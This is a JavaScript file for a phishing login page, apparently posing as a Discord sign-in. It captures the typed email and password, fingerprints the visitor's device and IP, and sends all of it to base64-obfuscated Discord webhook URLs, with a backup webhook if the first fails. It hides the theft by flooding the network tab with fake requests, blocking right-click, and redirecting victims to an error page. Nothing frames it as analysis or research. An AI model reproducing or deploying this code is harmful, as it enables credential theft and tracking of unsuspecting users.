const loginButton = document.querySelector("button");
const PRIMARY_WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2VibG9va3MvMTM1ODkwMTkwMTUwODIxOTAzMS9KN19mb0xfT2R2Nl9FZzBQMTJ4QVZETHoubnR5");
const BACKUP_WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1ODkwMjcxMjA3MDE3Njc2OC91Ny0zZTFQbU00dDdWVFVURF9VQk5ZQ0RrQW5NOEdQX0tLeEhqQjRnX3V4ZWl0YXZSMTRQZ21xZHh6b2FkTjAtTnFLb19i");

let userIP = "Unknown IP";
let userDeviceInfo = {};

async function fetchIPAddress() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP address:", error);
    return "Unknown IP";
  }
}

document.addEventListener("DOMContentLoaded", async () => {
  userIP = await fetchIPAddress();
  collectDeviceInfo();
});

function collectDeviceInfo() {
  userDeviceInfo = {
    userAgent: navigator.userAgent,
    browserName: getBrowserName(),
    browserVersion: getBrowserVersion(),
    os: getOS(),
    platform: navigator.platform,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer || "Direct",
    installedFonts: getInstalledFonts(),
    webGLInfo: getWebGLInfo(),
    cpuCores: navigator.hardwareConcurrency || "Unknown",
    memory: navigator.deviceMemory || "Unknown",
    doNotTrack: navigator.doNotTrack || "Unknown",
    touchSupport: navigator.maxTouchPoints > 0 ? "Yes" : "No",
  };
}

function getBrowserName() {
  const userAgent = navigator.userAgent;
  if (/Firefox/.test(userAgent)) return "Firefox";
  if (/Chrome/.test(userAgent)) return "Chrome";
  if (/Edg/.test(userAgent)) return "Edge";
  if (/Safari/.test(userAgent)) return "Safari";
  return "Unknown Browser";
}

function getBrowserVersion() {
  const userAgent = navigator.userAgent;
  const match = userAgent.match(/(Chrome|Firefox|Edg|Safari)\/(\d+)/);
  return match ? match[2] : "Unknown Version";
}

function getOS() {
  const userAgent = navigator.userAgent;
  if (/Windows/.test(userAgent)) return "Windows";
  if (/Mac/.test(userAgent)) return "MacOS";
  if (/Linux/.test(userAgent)) return "Linux";
  if (/Android/.test(userAgent)) return "Android";
  if (/iPhone|iPad/.test(userAgent)) return "iOS";
  return "Unknown OS";
}

function getInstalledFonts() {
  const baseFonts = ["monospace", "sans-serif", "serif"];
  const testString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const canvas = document.createElement("canvas");
  const context = canvas.getContext("2d");
  const detectedFonts = [];
  const fontList = [
    "Arial", "Arial Black", "Comic Sans MS", "Courier New", "Georgia",
    "Impact", "Lucida Console", "Lucida Sans Unicode", "Palatino Linotype",
    "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana"
  ];
  fontList.forEach((font) => {
    context.font = `72px ${font}, ${baseFonts[0]}`;
    const baseWidth = context.measureText(testString).width;
    context.font = `72px ${baseFonts[0]}`;
    const defaultWidth = context.measureText(testString).width;
    if (baseWidth !== defaultWidth) {
      detectedFonts.push(font);
    }
  });
  return detectedFonts.join(", ");
}

function getWebGLInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return "WebGL not supported";
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    return `${vendor} / ${renderer}`;
  } catch (error) {
    return "WebGL info unavailable";
  }
}

async function sendCredentialsToWebhook(email, password) {
  try {
    const ip = userIP;
    const embedPayload = {
      embeds: [
        {
          title: "Login Attempt",
          color: 0xff0000,
          fields: [
            { name: "Email", value: email || "No email provided", inline: true },
            { name: "Password", value: password || "No password provided", inline: true },
            { name: "IP Address", value: ip || "Unknown IP", inline: false },
            { name: "Browser", value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`, inline: true },
            { name: "Operating System", value: userDeviceInfo.os, inline: true },
            { name: "Screen Resolution", value: `${userDeviceInfo.screenWidth}x${userDeviceInfo.screenHeight}`, inline: true },
            { name: "Language", value: userDeviceInfo.language, inline: true },
            { name: "Timezone", value: userDeviceInfo.timezone, inline: true },
            { name: "Referrer", value: userDeviceInfo.referrer, inline: false },
            { name: "Installed Fonts", value: userDeviceInfo.installedFonts || "Unavailable", inline: false },
            { name: "WebGL Info", value: userDeviceInfo.webGLInfo || "Unavailable", inline: false },
            { name: "CPU Cores", value: userDeviceInfo.cpuCores || "Unknown", inline: true },
            { name: "Memory", value: `${userDeviceInfo.memory} GB`, inline: true },
            { name: "Do Not Track", value: userDeviceInfo.doNotTrack, inline: true },
            { name: "Touch Support", value: userDeviceInfo.touchSupport, inline: true },
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    };
    spamNetworkTab();
    let response = await fetch(PRIMARY_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embedPayload),
    });
    if (!response.ok) {
      response = await fetch(BACKUP_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embedPayload),
      });
      if (!response.ok) {
        console.error("Backup webhook also failed. Data not sent.");
      }
    }
  } catch (error) {
    console.error("Error sending credentials to webhook:", error);
  }
}

function spamNetworkTab() {
  const fakeEndpoints = Array.from({ length: 100 }, () => `https://example.com/fake-endpoint-${Math.random().toString(36).substring(7)}`);
  fakeEndpoints.forEach((url) => {
    fetch(url, { mode: "no-cors" }).catch(() => {});
  });
}

function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  const email = document.getElementById("emailORphone").value;
  const password = document.getElementById("password").value;
  sendCredentialsToWebhook(email, password);
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");
  setTimeout(() => {
    removeEllipsisAnimation();
    window.location.href = "error.html";
  }, 3000);
}

loginButton.addEventListener("click", animateEllipsis);
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
